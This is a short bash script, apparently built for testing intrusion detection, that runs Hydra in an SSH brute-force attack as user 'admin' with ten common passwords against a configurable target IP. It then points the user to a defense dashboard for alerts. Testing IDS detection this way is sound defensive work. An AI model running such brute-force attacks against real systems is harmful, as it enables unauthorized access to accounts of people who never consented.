#!/bin/bash
# ===========================================
# SSH Brute Force Simulation
# ===========================================
# Simulates SSH brute force attack using Hydra
# For testing IDS detection capabilities
# ===========================================

TARGET=${1:-"192.168.1.1"}
WORDLIST=${2:-"/usr/share/wordlists/rockyou.txt"}
THREADS=${3:-4}
MAX_ATTEMPTS=${4:-50}

echo "╔═══════════════════════════════════════════════════════╗"
echo "║   SSH Brute Force Simulation                           ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo ""
echo "Target: $TARGET"
echo "Threads: $THREADS"
echo "Max Attempts: $MAX_ATTEMPTS"
echo ""
echo "Starting in 5 seconds... (Ctrl+C to cancel)"
sleep 5

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo "Error: hydra not found. Install with: sudo apt install hydra"
    exit 1
fi

# Create a small wordlist for testing
TEMP_WORDLIST="/tmp/test_passwords.txt"
cat > "$TEMP_WORDLIST" << 'EOF'
admin
password
123456
root
admin123
password123
test
guest
letmein
welcome
EOF

# Run hydra with limited attempts
echo "Starting SSH brute force attack..."
echo ""

hydra -l admin -P "$TEMP_WORDLIST" \
    -t $THREADS \
    -f \
    -V \
    ssh://$TARGET 2>&1 | head -n $MAX_ATTEMPTS

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Attack simulation complete."
echo "Check the defense dashboard for detection alerts."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Cleanup
rm -f "$TEMP_WORDLIST"
